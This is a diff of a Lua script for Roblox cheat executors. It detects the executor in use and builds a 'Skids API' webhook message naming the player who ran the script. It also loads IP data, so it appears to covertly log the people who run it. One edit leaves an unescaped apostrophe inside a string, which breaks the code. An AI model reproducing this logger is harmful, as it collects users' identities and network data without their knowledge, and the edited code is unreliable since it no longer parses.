@@ -2,9 +2,9 @@ do
     -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
     local function checkExploit()
         
-        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')
+        local exploitName = (syn and 'Synapse X') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')
 
-        exploitName = exploitName or 'I don\'t fucking know'
+        exploitName = exploitName or 'I don't fucking know'
 
         return exploitName
 
@@ -31,11 +31,11 @@ do
             local ipData = self.ipApi
        
        
-            scriptName = scriptName or 'Viva Mexico'
+            scriptName = scriptName or 'API'
        
        
             return {
-                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
+                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') Executed ' .. scriptName,
                 ["embeds"] = {
                         {
                         ["title"] = "Skids API",
